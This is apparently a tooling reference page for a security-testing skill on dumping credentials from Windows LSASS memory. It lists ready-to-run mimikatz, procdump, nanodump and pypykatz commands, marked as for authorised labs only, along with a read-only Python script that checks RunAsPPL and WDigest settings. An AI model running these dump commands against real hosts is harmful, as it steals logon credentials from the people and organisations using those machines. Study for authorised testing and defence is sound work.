# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`credential-dumping-lsass-and-memory`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `mimikatz` | `sekurlsa::logonpasswords` | LSASS secret extraction, authorised lab only | Windows |
| `procdump` | `procdump.exe -ma -r -n 1 lsass.exe C:\Windows\Temp\lsass.dmp` | Dump a protected process where policy allows, lab only | Windows |
| `nanodump` | `nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp` | Dump with reduced handle exposure | Windows |
| `Get-Process` | `Get-Process lsass &#124; Select-Object ProtectionLevel` | Read the protection level without touching memory | Windows |
| `pypykatz` | `pypykatz lsa minidump lsass.dmp` | Offline parsing of a dump | Linux / Windows |

## Minimal Lab Validation Script

Report the protection state and the access-mask evidence; a dump is a separate step with its own authorisation and handling.

```python
import subprocess

def ps(cmd):
    return subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                          capture_output=True, text=True).stdout.strip()

print("runasppl", ps("(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
                     "-ErrorAction SilentlyContinue).RunAsPPL") or "unset")
print("wdigest", ps("(Get-ItemProperty "
                    "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' "
                    "-ErrorAction SilentlyContinue).UseLogonCredential") or "unset")
print("lsass_protection", ps("(Get-Process lsass).ProtectionLevel"))
```

## Flag Notes

- `-ma` requests a full dump; `-r` uses a cloned handle and `-n 1` bounds the attempt count.
- `ProtectionLevel` reads `PsProtectedSignerLsa-Light` when RunAsPPL is in force.
- `lsa minidump` in pypykatz parses offline, so parsing does not require the source host.
